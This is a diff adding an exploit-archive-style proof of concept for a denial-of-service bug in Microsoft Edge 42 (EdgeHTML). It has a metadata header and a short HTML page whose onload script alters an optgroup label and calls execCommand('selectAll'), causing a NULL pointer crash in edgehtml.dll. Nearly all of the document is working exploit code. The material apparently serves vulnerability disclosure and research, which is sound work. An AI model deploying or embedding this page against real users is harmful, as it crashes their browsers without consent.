@@ -1,0 +1,42 @@
+# Exploit Title: Microsoft Edge edgehtml.dll!Tree::ANode::DocumentLayout. Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Bogdan Kurinnoy (b.kurinnoy@gmail.com)
+# Vendor Homepage: https://www.microsoft.com/
+# Version: Microsoft Edge 42.17134.1.0 (Microsoft EdgeHTML 17.17134)
+# Tested on: Windows 10 x64
+# CVE : N/A
+
+# Description:
+# Access violation while reading memory at 0x5C using a NULL pointer (microsoftedgecp.exe!edgehtml.dll!Tree::ANode::DocumentLayout)
+# https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/19594021/
+
+PoC.html
+
+<html>
+
+<head>
+
+<script>
+
+function ff() {
+	var v4= document.elementFromPoint(0,0);
+	v2.label = "C"; 
+	var v3= document.execCommand("selectAll", true);
+}
+
+</script>
+
+</head>
+
+<body onload=ff()>
+
+<select id="1" multiple="multiple">
+
+<optgroup id="v2" label="A">
+
+<option id="v1">
+
+</body>
+
+</html>
